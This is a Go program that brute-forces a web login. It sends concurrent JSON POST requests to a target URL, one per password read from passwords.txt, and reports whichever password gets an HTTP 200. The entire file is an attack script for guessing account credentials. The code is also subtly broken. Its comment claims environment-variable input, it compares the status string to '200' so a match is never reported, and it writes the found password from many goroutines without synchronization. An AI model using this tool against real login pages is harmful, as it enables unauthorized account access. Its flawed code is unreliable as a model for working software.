package main

import (
  "fmt"
  "encoding/json"
  "io/ioutil"
  "log"
  "bytes"
  "net/http"
  "os"
  "strings"
  "sync"
)

/*Main
 * Requires the url, port, and username to be sent as environment variables
 * Makes a POST request to the url with fields username, email, and password
 * Username and email values are set to the value provided in the program argument
 * Password values are taken from the passwords.txt file
 * All requests are JSON content type
 */

func main(){
  if len(os.Args) != 3 {
    log.Fatal("Please provide url and username.")
  }

  url := os.Args[1]
  username := os.Args[2]
  passwords := readInPasswords("passwords.txt")

  //Multithreaded solution
  var wg sync.WaitGroup
  wg.Add(len(passwords))
  foundPassword := ""
  for _, password := range passwords {
    go func(password string) {
      defer wg.Done()
      if postToURL(url, username, password) {
        foundPassword = password
      }
    }(password)
  }

  wg.Wait() //Wait until the for loop finishes.
  fmt.Println("Found password is: ", foundPassword)
}

//This function is gonna read the passwords in the file passwords.txt and return a slice of strings.
func readInPasswords(passwordFile string) []string {
  b, err := ioutil.ReadFile(passwordFile) //Passing the file name.
  if err != nil {
    fmt.Println(err)
  }

  str := string(b) //Convert content b to a string

  return strings.Split(str, "\n")
}

//postToURL
//Succeeded = true if res.status == 200
func postToURL(url string, username string, password string) (succeeded bool) {
  fmt.Println("password: ", password)
  values := map[string]string{"username": username, "email": username, "password": password}

  jsonValue, _ := json.Marshal(values)

  resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
  if err != nil {
    fmt.Println("Error occured: ", err)
    return false
  }
  defer resp.Body.Close()
  if resp.StatusCode == 200 {
    fmt.Println("Response status: ", resp.Status)
    var body interface{}
    json.NewDecoder(resp.Body).Decode(&body)
    fmt.Println(body)
  }
  
  return resp.Status == "200"
}
